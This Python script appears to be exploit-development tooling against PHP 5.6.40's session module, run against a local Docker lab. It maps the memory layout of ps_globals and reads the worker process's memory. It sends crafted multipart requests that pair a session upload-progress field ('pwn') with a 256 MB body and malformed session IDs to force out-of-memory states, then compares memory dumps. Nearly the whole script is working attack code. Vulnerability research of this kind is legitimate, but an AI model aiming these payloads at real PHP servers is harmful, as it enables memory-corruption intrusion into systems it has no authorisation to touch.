#!/usr/bin/env python3
"""5.6.40 (p2s5640, port 18103): full ps_globals dump before/after OOM arms.

5.6.40 _php_ps_globals (amd64, from php-5.6.40/ext/session/php_session.h):
  0x00 save_path      0x08 session_name    0x10 id (char*)
  0x18 extern_referer 0x20 entropy_file   0x28 cache_limiter
  0x30 entropy_length 0x38 cookie_lifetime 0x40 cookie_path
  0x48 cookie_domain  0x50 cookie_secure  0x54 cookie_httponly
  0x58 mod            0x60 default_mod    0x68 mod_data
  0x70 session_status 0x78 gc_probability 0x80 gc_divisor
  0x88 gc_maxlifetime 0x90 module_number  0x98 cache_expire
  0xa0 mod_user_names[7] 0xf8 mod_user_impl 0xfc mod_user_is_open
  0x100 serializer    0x108 http_session_vars
  0x110 auto_start    0x114 use_cookies   0x118 use_only_cookies
  0x11c use_trans_sid 0x120 apply_trans_sid 0x128 hash_func
  0x130 hash_ops     0x138 hash_bits_per_character
  0x140 send_cookie  0x144 define_sid    0x148 invalid_session_id
  0x150 rfc1867_progress 0x158 rfc1867_enabled 0x15c rfc1867_cleanup
  0x160 rfc1867_prefix(c,len) 0x170 rfc1867_name(c,len)
  0x180 rfc1867_freq 0x188 rfc1867_min_freq
  0x190 use_strict   0x194 session_data_hash[16]
"""
import subprocess, time, sys
sys.path.insert(0, r"C:\Users\likat\p2s52704\php72")
import drive as D

CONT = "p2s5640"
PORT = 18103
PS_OFF = 0xD4C060          # ps_globals BSS in libphp5.so (nm)
BND = b"BND5640"
HUGE_MB = 256

def sh(cmd):
    return subprocess.run(["docker", "exec", CONT, "sh", "-c", cmd],
                          capture_output=True, text=True).stdout

def worker_pid():
    out = sh("ps aux | grep www-data | grep -v grep | head -1 | awk '{print $2}'").strip()
    return int(out) if out else None

def libphp_base(pid):
    for line in sh("cat /proc/%d/maps" % pid).splitlines():
        if "libphp" in line:
            return int(line.split("-")[0], 16)
    return None

def rd(pid, addr, n=8):
    out = sh("perl /tmp/read_mem.pl %d %x %d" % (pid, addr, n)).strip()
    return bytes.fromhex(out) if out else None

FIELDS = [
    (0x00, "save_path"), (0x08, "session_name"), (0x10, "id"),
    (0x18, "extern_referer"), (0x20, "entropy_file"), (0x28, "cache_limiter"),
    (0x30, "entropy_length"), (0x38, "cookie_lifetime"), (0x40, "cookie_path"),
    (0x48, "cookie_domain"), (0x50, "cookie_secure"), (0x54, "cookie_httponly"),
    (0x58, "mod"), (0x60, "default_mod"), (0x68, "mod_data"),
    (0x70, "session_status"), (0x78, "gc_probability"), (0x80, "gc_divisor"),
    (0x88, "gc_maxlifetime"), (0x90, "module_number"), (0x98, "cache_expire"),
    (0xa0, "mod_user_names[0]"), (0xf8, "mod_user_impl"), (0xfc, "mod_user_open"),
    (0x100, "serializer"), (0x108, "http_session_vars"),
    (0x110, "auto_start"), (0x114, "use_cookies"), (0x118, "use_only_cookies"),
    (0x11c, "use_trans_sid"), (0x120, "apply_trans_sid"),
    (0x128, "hash_func"), (0x130, "hash_ops"), (0x138, "hash_bpc"),
    (0x140, "send_cookie"), (0x144, "define_sid"), (0x148, "invalid_session_id"),
    (0x150, "rfc1867_progress"), (0x158, "rfc1867_enabled"), (0x15c, "rfc1867_cleanup"),
    (0x160, "rfc1867_prefix.c"), (0x168, "rfc1867_prefix.len"),
    (0x170, "rfc1867_name.c"), (0x178, "rfc1867_name.len"),
    (0x180, "rfc1867_freq"), (0x188, "rfc1867_min_freq"),
    (0x190, "use_strict"),
]

def dump(pid, label):
    base = libphp_base(pid)
    if base is None:
        print("== %s: libphp NOT FOUND (pid %s)" % (label, pid)); return
    ps = base + PS_OFF
    print("== %s: pid=%s libphp=%s ps=%s" % (label, pid, hex(base), hex(ps)), flush=True)
    vals = {}
    for off, name in FIELDS:
        v = rd(pid, ps + off)
        vals[name] = v
        print("   %-22s @+0x%-4x = %s" % (name, off, v.hex() if v else "?"), flush=True)
    h = rd(pid, ps + 0x194, 16)
    print("   %-22s @+0x194 = %s" % ("session_data_hash", h.hex() if h else "?"), flush=True)
    idv = vals.get("id")
    if idv:
        a = int.from_bytes(idv, "little")
        if a:
            raw = rd(pid, a, 64)
            txt = raw[:32].decode("latin-1", "replace").replace("\x00", ".") if raw else "?"
            print("   >> id buffer @%s: %s  %r" % (hex(a), raw[:32].hex() if raw else "?", txt), flush=True)
    hv = vals.get("http_session_vars")
    if hv:
        a = int.from_bytes(hv, "little")
        if a:
            raw = rd(pid, a, 16)
            print("   >> zval @%s: %s" % (hex(a), raw.hex() if raw else "?"), flush=True)

def part(name, value=b"", filename=None):
    out = [b"--" + BND + b"\r\n",
           b'Content-Disposition: form-data; name="' + name + b'"']
    if filename is not None:
        out.append(b'; filename="' + filename + b'"')
        out.append(b"\r\nContent-Type: application/octet-stream")
    out.append(b"\r\n")
    out.append(value)
    out.append(b"\r\n")
    return b"".join(out)

def arm_body(sid, big_mb=HUGE_MB):
    return (part(b"PHPSESSID", sid)
            + part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")
            + part(b"f", b"A" * 64, b"a.txt")
            + part(b"big", b"B" * (big_mb * 1024 * 1024))
            + b"--" + BND + b"--\r\n")

def arm(c, sid, label):
    body = arm_body(sid)
    print("\n--- ARM %s: sid=%dB body=%dMB ---" % (label, len(sid), len(body) // (1024 * 1024)), flush=True)
    t0 = time.time()
    r = c.post("/index.php", body, False, maxread=65536)
    sc = r["headers"].get("set-cookie", "")
    print("  status=%s ttfb=%.2f total=%d closed=%s set_cookie_len=%d" %
          (r["status"], r["ttfb"], r["total"], r["closed"], len(sc)), flush=True)
    if sc:
        print("  Set-Cookie: %s" % sc[:200], flush=True)
    print("  body[:160]=%r" % r["body"][:160].decode("latin-1", "replace"), flush=True)
    time.sleep(0.5)

def main():
    what = sys.argv[1] if len(sys.argv) > 1 else "all"
    c = D.Conn("127.0.0.1", PORT, False, timeout=600)
    c.get("/index.php"); time.sleep(0.3)
    p0 = worker_pid()
    dump(p0, "BASELINE (after GET)")

    if what in ("all", "nul"):
        arm(c, b"\x00", "NUL")
        p = worker_pid(); print("worker now: %s (was %s)" % (p, p0), flush=True)
        dump(p, "AFTER NUL arm")

    if what in ("all", "long"):
        arm(c, b"A" * 4096, "LONG-4096")
        p = worker_pid(); print("worker now: %s (was %s)" % (p, p0), flush=True)
        dump(p, "AFTER LONG arm")

    if what in ("all", "std"):
        arm(c, b"a" * 32, "STD-32")
        p = worker_pid(); print("worker now: %s (was %s)" % (p, p0), flush=True)
        dump(p, "AFTER STD-32 arm")

    c.close()
    print("\nDONE")

if __name__ == "__main__":
    main()
